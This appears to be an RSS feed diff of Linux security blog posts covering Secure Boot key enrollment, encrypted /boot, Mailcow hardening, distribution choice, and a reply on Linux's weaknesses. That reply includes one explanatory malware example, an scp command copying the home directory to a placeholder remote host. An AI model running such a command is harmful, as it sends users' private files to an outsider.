+<p>If you are using <a href="#linux-hardened">linux‑hardened</a>, you can alternatively use the <code>deny_new_usb</code> kernel parameter &mdash; see <a href="https://blog.lizzie.io/preventing-usb-attacks-with-linux-hardened.html">&ldquo;Preventing USB Attacks with <code>linux&amp;#8209;hardened</code>&rdquo;</a>.</p>
+<h2 id="secure-boot">Secure Boot</h2>
+<p><a href="https://en.wikipedia.org/wiki/Unified_Extensible_Firmware_Interface#Secure_Boot">Secure Boot</a> can be used to secure the boot process by preventing the loading of unsigned UEFI drivers and bootloaders.</p>
+<p>One of the problems with Secure Boot, particularly on Linux, is that <a href="https://wiki.ubuntu.com/UEFI/SecureBoot#How_UEFI_Secure_Boot_works_on_Ubuntu">only the chainloader (shim), bootloader (GRUB), and kernel are verified in a typical setup</a>. The <a href="https://wiki.ubuntu.com/Initramfs#Detailed_Description">initramfs</a> is often left unverified and unencrypted, leaving the door open for an <a href="https://en.wikipedia.org/wiki/Evil_maid_attack">evil maid attack</a>.</p>
+<p>The firmware on most devices is also preconfigured to trust Microsoft&rsquo;s keys for both Windows and third‑parties, leading to a <a href="https://github.com/ventoy/Ventoy/issues/135">large attacks surface</a>.</p>
+<h3 id="enrolling-your-own-keys">Enrolling your own keys</h3>
+<hr>
+<p><em><strong>Please note that this procedure <a href="https://forums.lenovo.com/t5/Other-Linux-Discussions/Reports-of-custom-secure-boot-keys-bricking-recent-X-P-and-T-series-laptops/m-p/5105571">will brick some non‑compliant UEFI implementations</a>.</strong> You should research your specific computer/motherboard, looking for reported successes and failures alike, before attempting. Ideally, you should be prepared to reprogram the EEPROM to a known‑good state if something goes catastrophically wrong. Integrated &lsquo;BIOS flashback&rsquo; functionality may be an adequate recovery option.</em></p>
+<hr>
+<p>To eliminate the need to trust the OEM&rsquo;s keys, I recommend using <a href="https://github.com/Foxboron/sbctl">sbctl</a>.</p>
+<p>First, you need to boot into your firmware interface and enter Secure Boot setup mode. Then boot back into Linux and <a href="https://github.com/Foxboron/sbctl/blob/master/README.md#key-creation-and-enrollment">follow the instructions</a> to generate and enroll your own keys.</p>
+<p>On certain hardware, this will not work. Instead, you will need to export the public key to your EFI partition and manually import it through your firmware interface:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">openssl x509 -in /usr/share/secureboot/keys/db/db.pem -outform DER -out /boot/efi/EFI/fedora/DB.cer
+</span></span></code></pre></div><h3 id="unified-kernel-image">Unified Kernel Image</h3>
+<p>On most desktop Linux systems, it is possible to create a <a href="https://wiki.archlinux.org/title/Unified_kernel_image">unified kernel image</a> (UKI) that contains the kernel, initramfs, and microcode. This unified kernel image can then be signed with the keys created by sbctl.</p>
+<p>For Fedora Workstation, you can follow <a href="https://haavard.name/2022/06/22/full-uefi-secure-boot-on-fedora-using-signed-initrd-and-systemd-boot/">Håvard Moen&rsquo;s guide</a> which covers sbctl installation, unified kernel image generation with <a href="https://wiki.archlinux.org/title/Dracut">dracut</a>, and automatic signing with systemd‑boot.</p>
+<p>On Arch, the process is very similar, though sbctl is already included in the official repositories and you will need to switch from <a href="https://wiki.archlinux.org/title/Mkinitcpio">mkinitpcio</a> to dracut. Arch with linux‑hardened works well with sbctl, but some level of tedious pacman hooks are required for appropriately timing the re‑signing of all relevant files every time the kernel or bootloader is updated.</p>
+<p>In my opinion, this is the most straightforward setup, with a lot of potential such as <a href="https://0pointer.de/blog/brave-new-trusted-boot-world.html">systemd&rsquo;s future UKI plans including support for early‑boot attestation</a>. With that being said, it does not appear to work well with specialized setups such as Fedora Silverblue/Kinoite or Ubuntu with <a href="https://github.com/ubuntu/zsys">ZSys</a>. More testing is needed to see if they can be made to work.</p>
+<h3 id="encrypted-boot">Encrypted /boot</h3>
+<h4 id="opensuse">openSUSE</h4>
+<p>openSUSE and its derivatives come with encrypted /boot out of the box (as part of the root partition). This setup does work, using encryption to sidestep the unverified initramfs problem.</p>
+<p>However, there are some caveats:</p>
+<ul>
+<li>openSUSE uses LUKS1 instead of LUKS2 for encryption.</li>
+<li>GRUB supports PBKDF2 key derivation only, not Argon2 (the LUKS2 default).</li>
+<li>Some extra steps are necessary to <a href="https://en.opensuse.org/SDB:Encrypted_root_file_system#Avoiding_to_type_the_passphrase_twice_in_Leap_and_Tumbleweed">avoid typing the encryption password twice</a>.</li>
+<li>Though rather tedious, you could potentially improve security by:
+<ul>
+<li><a href="#enrolling-your-own-keys">Enrolling your own Secure Boot keys</a></li>
+<li>Reinstalling GRUB with <code>--no-shim-lock</code></li>
+<li>Signing GRUB and the kernel with your own keys</li>
+<li>Removing shim and MOK from the boot chain</li>
+<li>Setting up hooks to automate these tasks for every update</li>
+</ul>
+</li>
+</ul>
+<h4 id="other-distributions">Other Distributions</h4>
+<p>On systems which use <a href="https://github.com/Antynea/grub-btrfs">grub‑btrfs</a> to mimic openSUSE (such as <a href="https://github.com/tommytran732/Arch-Setup-Script">my old Arch setup</a>), there are a few things to keep in mind:</p>
+<ul>
+<li>It will be easier to use LUKS1 than LUKS2 with PBKDF2 for this setup.
+<ul>
+<li>I have run into issues where GRUB will detect a LUKS1 partition converted to LUKS2 with PBKDF2 but not a pre‑existing LUKS2 partition.</li>
+</ul>
+</li>
+<li>Include /boot in your root partition instead of as a seperate partition.
+<ul>
+<li>With a seperate /boot partition, an evil maid attack can theoretically replace it with a malicious /boot partition. Unlocking the drive through a fake decryption prompt on the malicious partition will subsequently compromise the rest of the system.</li>
+</ul>
+</li>
+<li><a href="#enrolling-your-own-keys">Enroll your own Secure Boot keys</a></li>
+<li>Install GRUB with the <code>--no-shim-lock</code> option. The full command I use on Arch is:
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">grub-install --target=x86_64-efi --efi-directory=/boot/efi --bootloader-id=GRUB --modules=&#34;normal test efi_gop efi_uga search echo linux all_video gfxmenu gfxterm_background gfxterm_menu gfxterm loadenv configfile gzio part_gpt cryptodisk luks gcry_rijndael gcry_sha256 btrfs tpm&#34; --disable-shim-lock
+</span></span></code></pre></div></li>
+<li>Sign GRUB and the kernel with your own keys</li>
+<li>Remove shim and MOK from the boot chain (if applicable)</li>
+<li>Set up hooks to automate these tasks for every update (<a href="https://wiki.archlinux.org/title/Unified_Extensible_Firmware_Interface/Secure_Boot#Signing_the_kernel_with_a_pacman_hook">pacman hooks for Arch</a>)</li>
+<li>Disable the TPM from your firmware to prevent GRUB attempting <a href="https://www.gnu.org/software/grub/manual/grub/html_node/Measured-Boot.html">measured boot</a>, which <a href="https://github.com/Antynea/grub-btrfs/issues/156">does not work with grub-btrfs</a>.</li>
+</ul>
+<h3 id="notes-on-secure-boot">Notes on Secure Boot</h3>
+<p>After setting up Secure Boot, it is crucial that you password-protect your UEFI settings (sometimes called &lsquo;supervisor&rsquo; or &lsquo;administrator&rsquo; password) &mdash; otherwise an adversary can simply disable Secure Boot.</p>
+<p>These recommendations can make you a little more resistant to evil maid attacks, but they <a href="https://madaidans-insecurities.github.io/guides/linux-hardening.html#verified-boot">do not constitute a proper verified boot process</a> as found on <a href="https://source.android.com/security/verifiedboot">Android</a>, <a href="https://support.google.com/chromebook/answer/3438631">ChromeOS</a>, or <a href="https://docs.microsoft.com/en-us/windows/security/information-protection/secure-the-windows-10-boot-process">Windows</a>.</p>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>Linux Insecurities</title>
+      <link>https://loudrxiv.github.io/posts/linux/linux-insecurities/</link>
+      <pubDate>Mon, 18 Jul 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://loudrxiv.github.io/posts/linux/linux-insecurities/</guid>
+      <description>There is a common misconception among privacy communities that Linux is one of the more secure operating systems, either because it is open-source or because it is widely used in the cloud. However, this is a far cry from reality.
+There is already a very in-depth technical blog explaining the various security weaknesses of Linux by Madaidan, Whonix&amp;rsquo;s Security Researcher. This page will attempt to address some of the questions commonly raised in reaction to his blog post.</description>
+      <content:encoded><![CDATA[<p>There is a common misconception among privacy communities that Linux is one of the more secure operating systems, either because it is open-source or because it is widely used in the cloud. However, this is a far cry from reality.</p>
+<p>There is already a very in-depth technical blog explaining the various security weaknesses of Linux by Madaidan, <a href="https://www.whonix.org/">Whonix</a>&rsquo;s Security Researcher. This page will attempt to address some of the questions commonly raised in reaction to his blog post. You can find the original article <a href="https://madaidans-insecurities.github.io/linux.html">here</a>.</p>
+<p><img loading="lazy" src="/images/madaidan-insecurities-linux.png" alt="Madaidan&amp;rsquo;s Linux Insecurities"  />
+</p>
+<h2 id="why-is-linux-used-on-servers-if-it-is-so-insecure">Why is Linux used on servers if it is so insecure?</h2>
+<p>On servers, while most of the problems referenced in the article still exist, they are somewhat less problematic.</p>
+<p>On Desktop Linux, GUI applications run under your user, and thus have access to all of your files in <code>/home</code>. This is in contrast to how system daemons typically run on servers, where they have their own group and user. For example, NGINX will run under <code>nginx:nginx</code> on Red Hat distributions, or <code>www-data:www-data</code> on Debian based ones. Discretionary Access Control does help with filesystem access control for server processes, but is useless for desktop applications.</p>
+<p>Another thing to keep in mind is that Mandatory Access Control is also somewhat effective on servers, as commonly run system daemons are confined. In contrast, on desktop, there is virtually no AppArmor profile to confine even regularly used apps like Chrome or Firefox, let alone less common ones. On SELinux systems, these apps run in the UNCONFINED SELinux domain.</p>
+<p>Linux servers are lighter than Desktop Linux systems by orders of magnitude, without hundreds of packages and dozens of system daemons running like X11, audio servers, printing stack, and so on. Thus, the attack surface is much smaller.</p>
+<h2 id="linux-hardening-myths">Linux Hardening Myths</h2>
+<p>There is a common claim in response to Madaidan that Linux is only insecure by default, and that an experienced user can make it the most secure operating system out there, surpassing the likes of macOS or ChromeOS. Unfortunately, this is wishful thinking. There is no amount of hardening that one can reasonably apply as a user to fix up the inherent issues with Linux.</p>
+<h3 id="lack-of-verified-boot">Lack of verified boot</h3>
+<p>macOS, ChromeOS, and Android have a clear distinction between the system and user installed application. In over simplified terms, the system volume is signed by the OS vendor, and the firmware and boot loader works to make sure that said volume has the authorized signature. The operating system itself is immutable, and nothing the user does will need or be allowed to tamper with the system volume.</p>
+<p>On Linux, there is no such clear distinction between the system and user installed applications. Linux distributions are a bunch of packages put together to make a system that works, and thus every package is treated as part of said system. The end result is that binaries, regardless of whether they are vital for the system to function or just an extra application, are thrown into the same directories as each other (namely <code>/usr/bin</code> and <code>/usr/local/bin</code>). This makes it impossible for an end user to setup a verification mechanism to verify the integrity of &ldquo;the system&rdquo;, as said &ldquo;system&rdquo; is not clearly defined in the first place.</p>
+<h3 id="lack-of-application-sandboxing">Lack of application sandboxing</h3>
+<p>Operating systems like Android and ChromeOS have full system mandatory access control, every process from the init process is strictly confined. Regardless of which application you install or how you install them, they have to play by the rules of an untrusted SELinux domain and are only able to utilize unprivileged APIs.</p>
+<p>Even on macOS, where the application sandbox is opt-in for developers, there is still a permission control system (TCC) for unprivileged applications. Apps run by the user do not have unrestricted access to their microphone, webcam, keystrokes, sensitive documents, and so on.</p>
+<p>On Linux, it is quite the opposite. Out of the box, most systems only have a few system daemons confined. Some Linux distributions don&rsquo;t even have a Mandatory Access Control system at all. Applications are designed in an environment where they expect to be able to do whatever they want, and the app sandboxes/mandatory access control system are merely an afterthought trying to restrict an app to only access what it expects to be accessible.</p>
+<p>This is reflected in the under utilization of the <a href="https://docs.flatpak.org/en/latest/portal-api-reference.html">Portals API</a> as an example. Portals is designed to be an API where apps have to prompt the user to access their files (through the File Manager) or their microphone and camera. Unfortunately, the vast majority of apps are not designed with this in mind, and expect direct access to the filesystem, pulseaudio socket or the entire <code>/dev</code>. As a result, Flatpak maintainers often opt to have extremely lax permissions to the point where they have to grant <code>filesystem=home</code>, <code>filesystem=host</code>, <code>socket=pulseaudio</code> or <code>devices=all</code>, otherwise apps will break and give users a bad experience.</p>
+<p>To make matters worse, some system daemons are not designed with permission control in mind at all. For example, PulseAudio does not have any concept of audio in or out permission. Thus, the user is often left with only the choice of granting an app access to the socket or not. If they want to block microphone access, they have to block access to the socket, and thus break audio playback in the process. If they do want an audio playback, then they have to allow access to the PulseAudio socket, which in turns give an app unrestricted access to record them at any moment.</p>
+<p>The only way to systematically fix this problem is to design a whole new system from scratch with a permission model like that of Android in mind. And even when that happens, it will take substantial work to get developers to develop their apps for said system.</p>
+<h2 id="but-linux-is-open-source">But Linux is open source!</h2>
+<p>Something being open source does not imply that it is inherently private, secure, or trustworthy. I recommend reading the <a href="/posts/knowledge/floss-security">FLOSS Security</a> post by <a href="https://seirdy.one/posts/2022/02/02/floss-security/">Rohan Kumar</a>.</p>
+<h2 id="but-there-is-less-malware-on-linux">But there is less malware on Linux!</h2>
+<p><strong>Security by irrelevance does not work</strong>. Just because there are fewer users of your favorite operating system does not make it any safer.</p>
+<p>Ask yourself this: Would you ditch Windows for ReactOS considering that it is a lot less popular and is less targeted? Likewise, would you ditch Linux desktop when it becomes the mainstream solution for the BSDs or some niche operating systems just because they are less popular?</p>
+<p>Malware for Linux does exist, and it is not hard to make. It can be something as trivial as a shell script or binary executing <code>scp -r ~/ malware@xx.xx.xx.xx:/data</code>. Due to the lack of application sandboxing or an application permission model, your computer can be compromised the moment you execute a malicious binary, shell script, or install script with or without root and with or without an exploit. This is, of course, not to discount the fact that many exploits do exist on Linux just like on any other operating systems as well.</p>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>Slightly Improving Mailcow Security</title>
+      <link>https://loudrxiv.github.io/posts/linux/slightly-improving-mailcow-security/</link>
+      <pubDate>Mon, 18 Jul 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://loudrxiv.github.io/posts/linux/slightly-improving-mailcow-security/</guid>
+      <description>Mailcow is a fairly popular self-hosted mail server. If you use it, there are a few ways you can improve its security by following these steps.
+Postfix Configuration Consider disabling weak ciphers and TLS versions below 1.2 in data/conf/postfix/extra.cf:
+tls_high_cipherlist = ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256 tls_preempt_cipherlist = yes smtp_tls_protocols = !SSLv2, !SSLv3, !TLSv1, !TLSv1.1 smtp_tls_ciphers = high smtp_tls_mandatory_ciphers = high smtpd_tls_protocols = !SSLv2, !SSLv3, !TLSv1, !TLSv1.1 smtpd_tls_ciphers = high smtpd_tls_mandatory_ciphers = high NGINX Configuration These security configurations can be added/modified in data/conf/nginx/includes/site-defaults.</description>
+      <content:encoded><![CDATA[<p><img loading="lazy" src="/images/mailcow.png" alt="Mailcow"  />
+</p>
+<p>Mailcow is a fairly popular self-hosted mail server. If you use it, there are a few ways you can improve its security by following these steps.</p>
+<h2 id="postfix-configuration">Postfix Configuration</h2>
+<p>Consider disabling weak ciphers and TLS versions below 1.2 in <code>data/conf/postfix/extra.cf</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">tls_high_cipherlist = ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256
+</span></span><span class="line"><span class="cl">tls_preempt_cipherlist = yes
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">smtp_tls_protocols = !SSLv2, !SSLv3, !TLSv1, !TLSv1.1
+</span></span><span class="line"><span class="cl">smtp_tls_ciphers = high
+</span></span><span class="line"><span class="cl">smtp_tls_mandatory_ciphers = high
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">smtpd_tls_protocols = !SSLv2, !SSLv3, !TLSv1, !TLSv1.1
+</span></span><span class="line"><span class="cl">smtpd_tls_ciphers = high
+</span></span><span class="line"><span class="cl">smtpd_tls_mandatory_ciphers = high
+</span></span></code></pre></div><h2 id="nginx-configuration">NGINX Configuration</h2>
+<p>These security configurations can be added/modified in <code>data/conf/nginx/includes/site-defaults.conf</code>.</p>
+<h3 id="ssl-ciphers">SSL Ciphers</h3>
+<p>Consider only supporting ciphers matching that of TLSv1.3:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ssl_ciphers &#34;ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-GCM-SHA256&#34;;
+</span></span></code></pre></div><h3 id="hsts">HSTS</h3>
+<p>Consider adding <code>includeSubDomains;</code> and <code>preload;</code> to the HSTS configuration if all of your services are using HTTPS:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">add_header Strict-Transport-Security &#34;max-age=63072000; includeSubDomains; preload&#34;;
+</span></span></code></pre></div><h3 id="x-xss-protection">X-XSS-Protection</h3>
+<p>We will setup Content Security, so this header is no longer needed. In fact, it may do <a href="https://github.com/helmetjs/helmet/issues/230">more harm than good</a>. Change the setting to <code>0</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">add_header X-XSS-Protection &#34;0&#34;;
+</span></span></code></pre></div><h3 id="permission-policy">Permission Policy</h3>
+<p>Mailcow does not need any special permissions to operate, except for USB which is needed to access your FIDO2 keys if you use them.</p>
+<p>Add this header to deny other permissions:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">add_header Permissions-Policy &#34;accelerometer=(), ambient-light-sensor=(), autoplay=(), battery=(), camera=(), clipboard-read=(), display-capture=(), document-domain=(), encrypted-media=(), fullscreen=(), geolocation=(), gyroscope=(), hid=(), idle-detection=(), interest-cohort=(), magnetometer=(), microphone=(), midi=(), payment=(), picture-in-picture=(), screen-wake-lock=(), serial=(), usb=(), sync-xhr=(), xr-spatial-tracking=()&#34;;
+</span></span></code></pre></div><h3 id="content-security-policy">Content Security Policy</h3>
+<p>Use the following as your <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP#:~:text=Content%20Security%20Policy%20(CSP)%20is,site%20defacement%2C%20to%20malware%20distribution.">Content Security Policy</a>:</p>
+<h4 id="if-you-use-gravatar-with-sogo">If you use Gravatar with SOGo</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">add_header Content-Security-Policy &#34;default-src &#39;none&#39;; connect-src &#39;self&#39; https://api.github.com; font-src &#39;self&#39; https://fonts.gstatic.com; img-src &#39;self&#39; data:; script-src &#39;self&#39; &#39;unsafe-inline&#39;; style-src &#39;self&#39; &#39;unsafe-inline&#39; https://fonts.googleapis.com; frame-ancestors &#39;none&#39;; block-all-mixed-content; base-uri &#39;none&#39;&#34;;
+</span></span></code></pre></div><h4 id="if-you-do-not-use-gravatar-with-sogo">If you do not use Gravatar with SOGo</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">add_header Content-Security-Policy &#34;default-src &#39;none&#39;; connect-src &#39;self&#39; https://api.github.com https://www.gravatar.com; font-src &#39;self&#39; https://fonts.gstatic.com; img-src &#39;self&#39; data: https://www.gravatar.com; script-src &#39;self&#39; &#39;unsafe-inline&#39;; style-src &#39;self&#39; &#39;unsafe-inline&#39; https://fonts.googleapis.com; frame-ancestors &#39;none&#39;; block-all-mixed-content; base-uri &#39;none&#39;&#34;;
+</span></span></code></pre></div><h3 id="cross-origin-resource-opener-and-embedder-policies">Cross-Origin Resource, Opener, and Embedder Policies</h3>
+<p>Mailcow does not use any cross site scripts, or documents. Thus, you should set CORP and COOP headers to their strictest configuration:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">add_header Cross-Origin-Resource-Policy same-origin;
+</span></span><span class="line"><span class="cl">add_header Cross-Origin-Opener-Policy same-origin;
+</span></span></code></pre></div><p>If you do not use Gravatar with SOGo, you can also set COEP to require-corp since image embedding will not be used either:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">add_header Cross-Origin-Embedder-Policy require-corp;
+</span></span></code></pre></div>]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>Choosing Your Desktop Linux Distribution</title>
+      <link>https://loudrxiv.github.io/posts/linux/choosing-your-desktop-linux-distribution/</link>
+      <pubDate>Sun, 17 Jul 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://loudrxiv.github.io/posts/linux/choosing-your-desktop-linux-distribution/</guid>
+      <description>Not all Linux distributions are created equal. When choosing a Linux distribution, there are several things you need to keep in mind.
+Release Cycle You should choose a distribution which stays close to the stable upstream software releases, typically rolling release distributions. This is because frozen release cycle distributions often don’t update package versions and fall behind on security updates.
+For frozen distributions, package maintainers are expected to backport patches to fix vulnerabilities (Debian is one such example) rather than bump the software to the “next version” released by the upstream developer.</description>
+      <content:encoded><![CDATA[<p>Not all Linux distributions are created equal. When choosing a Linux distribution, there are several things you need to keep in mind.</p>
+<h2 id="release-cycle">Release Cycle</h2>
+<p>You should choose a distribution which stays close to the stable upstream software releases, typically rolling release distributions. This is because frozen release cycle distributions often don’t update package versions and fall behind on security updates.</p>
+<p>For frozen distributions, package maintainers are expected to backport patches to fix vulnerabilities (Debian is one such <a href="https://www.debian.org/security/faq#handling">example</a>) rather than bump the software to the “next version” released by the upstream developer. Some security fixes <a href="https://arxiv.org/abs/2105.14565">do not</a> receive a <a href="https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures">CVE</a> (particularly less popular software) at all and therefore do not make it into the distribution with this patching model. As a result minor security fixes are sometimes held back until the next major release.</p>
+<p>In fact, in certain cases, there have been vulnerabilities introduced by Debian because of their patching process. <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1633467">Bug 1633467</a> and <a href="https://www.debian.org/security/2008/dsa-1571">DSA-1571</a> are examples of this.</p>
+<p><img loading="lazy" src="/images/upstream-distros-gap.png" alt="Upstream / Distros Gap"  />
+</p>
+<p>Holding packages back and applying interim patches is generally not a good idea, as it diverges from the way the developer might have intended the software to work. <a href="https://rootco.de/aboutme/">Richard Brown</a> has a presentation about this:</p>
+<div class="youtube-embed-div">
+    <iframe src="https://www.youtube-nocookie.com/embed/i8c0mg_mS7U" class="youtube-embed-frame" allowfullscreen title="YouTube Video"></iframe>
+</div>  
+<h2 id="traditional-and-atomic-updates">Traditional and Atomic updates</h2>
+<p>Traditionally, Linux distributions update by sequentially updating the desired packages. Traditional updates such as those used in Fedora, Arch Linux, and Debian based distributions can be less reliable if an error occurs while updating.</p>
+<p>Atomic updating distributions apply updates in full or not at all. Typically, transactional update systems are also atomic.</p>
+<p>A transactional update system creates a snapshot that is made before and after an update is applied. If an update fails at any time (perhaps due to a power failure), the update can be easily rolled back to a “last known good state.&quot;</p>
+<p><a href="https://twitter.com/adsamalik">Adam Šamalík</a> has a presentation with <code>rpm-ostree</code> in action:</p>
+<div class="youtube-embed-div">
+    <iframe src="https://www.youtube-nocookie.com/embed/-hpV5l-gJnQ" class="youtube-embed-frame" allowfullscreen title="YouTube Video"></iframe>
+</div>  
+<p>Even if you are worried about the stability of the system because of regularly updated packages (which you shouldn&rsquo;t be), it makes more sense to use a system which you can safely update and rollback instead of an outdated distribution partially made up of unreliable backport packages without an easy rollback mechanism in case something goes wrong like Debian.</p>
+<h2 id="arch-based-distributions">Arch-based Distributions</h2>
+<p>Arch Linux has very up to date packages with minimal downstream patching. That being said, Arch based distributions are not recommended for those new to Linux, regardless of the distribution. Arch does not have an distribution update mechanism for the underlying software choices. As a result you have to stay aware with current trends and adopt technologies as they supersede older practices on your own.</p>
+<p>For a secure system, you are also expected to have sufficient Linux knowledge to properly set up security for their system such as adopting a <a href="https://en.wikipedia.org/wiki/Mandatory_access_control">mandatory access control</a> system, setting up <a href="https://en.wikipedia.org/wiki/Loadable_kernel_module#Security">kernel module</a> blacklists, hardening boot parameters, manipulating <a href="https://en.wikipedia.org/wiki/Sysctl">sysctl</a> parameters, and knowing what components they need such as <a href="https://en.wikipedia.org/wiki/Polkit">Polkit</a>.</p>
+<p>If you are experienced with Linux and wish to use an Arch-based distribution, you should use Arch Linux proper, not any of its derivatives. Here are some examples of why that is the case:</p>
+<ul>
+<li><strong>Manjaro</strong>: This distribution holds packages back for 2 weeks to make sure that their own changes do not break, not to make sure that upstream is stable. When AUR packages are used, they are often built against the latest <a href="https://en.wikipedia.org/wiki/Library_(computing)">libraries</a> from Arch’s repositories.</li>
+<li><strong>Garuda</strong>: They use <a href="https://aur.chaotic.cx/">Chaotic-AUR</a> which automatically and blindly compiles packages from the AUR. There is no verification process to make sure that the AUR packages don’t suffer from supply chain attacks.</li>
+</ul>
+<h2 id="kicksecure">Kicksecure</h2>
+<p>While you should not use outdated distributions like Debian, if you decide to use it, it would be a good idea to <a href="https://www.kicksecure.com/wiki/Debian">convert</a> it into <a href="https://www.kicksecure.com/">Kicksecure</a>. Kicksecure, in oversimplified terms, is a set of scripts, configurations, and packages that substantially reduce the attack surface of Debian. It covers a lot of privacy and hardening recommendations by default.</p>
+<h2 id="security-focused-distributions">“Security-focused” Distributions</h2>
+<p>There is often some confusion about “security-focused” distributions and “pentesting” distributions. A quick search for “the most secure Linux distribution” will often give results like Kali Linux, Black Arch and Parrot OS. These distributions are offensive penetration testing distributions that bundle tools for testing other systems. They don’t include any “extra security” or defensive mitigations intended for regular use.</p>
+<h2 id="linux-libre-kernel-and-libre-distributions">Linux-libre Kernel and “Libre” Distributions</h2>
+<p><strong>Do not</strong> use the Linux-libre kernel, since it <a href="https://www.phoronix.com/scan.php?page=news_item&amp;px=GNU-Linux-Libre-5.7-Released">removes security mitigations</a> and <a href="https://news.ycombinator.com/item?id=29674846">suppresses kernel warnings</a> about vulnerable microcode for ideological reasons.</p>
+<p>If you want to use one of these distributions for reasons other than ideology, you should make sure that they there is a way to easily obtain, install and update a proper kernel and missing firmware. For example, if you are looking to use <a href="https://guix.gnu.org/en/download/">GUIX</a>, you should absolutely use something like the <a href="https://gitlab.com/nonguix/nonguix">Nonguix</a> repository and get all of the fixes as mentioned above.</p>
+<h2 id="wayland">Wayland</h2>
+<p>You should use a desktop environment that supports the <a href="https://en.wikipedia.org/wiki/Wayland_(display_server_protocol)">Wayland</a> display protocol as it developed with security <a href="https://lwn.net/Articles/589147/">in mind</a>. Its predecessor, <a href="https://en.wikipedia.org/wiki/X_Window_System">X11</a>, does not support GUI isolation, allowing all windows to <a href="https://blog.invisiblethings.org/2011/04/23/linux-security-circus-on-gui-isolation.html">record screen, log and inject inputs in other windows</a>, making any attempt at sandboxing futile. While there are options to do nested X11 such as <a href="https://en.wikipedia.org/wiki/Xpra">Xpra</a> or <a href="https://en.wikipedia.org/wiki/Xephyr">Xephyr</a>, they often come with negative performance consequences and are not convenient to set up and are not preferable over Wayland.</p>
+<p>Fortunately, common environments such as <a href="https://www.gnome.org">GNOME</a>, <a href="https://kde.org">KDE</a>, and the window manager <a href="https://swaywm.org">Sway</a> have support for Wayland. Some distributions like Fedora and Tumbleweed use it by default, and some others may do so in the future as X11 is in <a href="https://www.phoronix.com/scan.php?page=news_item&amp;px=X.Org-Maintenance-Mode-Quickly">hard maintenance mode</a>. If you’re using one of those environments it is as easy as selecting the “Wayland” session at the desktop display manager (<a href="https://en.wikipedia.org/wiki/GNOME_Display_Manager">GDM</a>, <a href="https://en.wikipedia.org/wiki/Simple_Desktop_Display_Manager">SDDM</a>).</p>
+<p>Try <strong>not</strong> to use desktop environments or window managers that do not have Wayland support such as Cinnamon (default on Linux Mint), Pantheon (default on Elementary OS), MATE, Xfce, and i3. If you are using i3, consider switching to <a href="https://swaywm.org">Sway</a>, which is a drop-in replacement with Wayland support as mentioned above.</p>
+<h2 id="recommended-distributions">Recommended Distributions</h2>
+<p>Here is a quick non authoritative list of distributions that are generally better than others:</p>
+<h3 id="fedora-workstation">Fedora Workstation</h3>
+<p><img loading="lazy" src="/images/fedora-screenshot.png" alt="Fedora"  />
+</p>
+<p><a href="https://getfedora.org/en/workstation/">Fedora Workstation</a> is a great general purpose Linux distribution, especially for those who are new to Linux. It is a semi-rolling release distribution. While some packages like GNOME are frozen until the next Fedora release, most packages (including the kernel) are updated frequently throughout the lifespan of the release. Each Fedora release is supported for one year, with a new version released every 6 months.</p>
+<p>WIth that, Fedora generally adopts newer technologies before other distributions e.g., <a href="https://wayland.freedesktop.org/">Wayland</a>, <a href="https://pipewire.org/">PipeWire</a>, and soon, <a href="https://fedoraproject.org/wiki/Changes/FsVerityRPM">FS-Verity</a>. These new technologies often come with improvements in security, privacy, and usability in general.</p>
+<p>While lacking transactional or atomic updates, Fedora&rsquo;s package manager, <code>dnf</code>, has a great rollback and undo feature that is generally missing from other package managers. You can read more about it on <a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/9/html/managing_software_with_the_dnf_tool/assembly_handling-package-management-history_managing-software-with-the-dnf-tool">Red Hat&rsquo;s documentation</a>.</p>
+<h3 id="fedora-silverblue--kinoite">Fedora Silverblue &amp; Kinoite</h3>
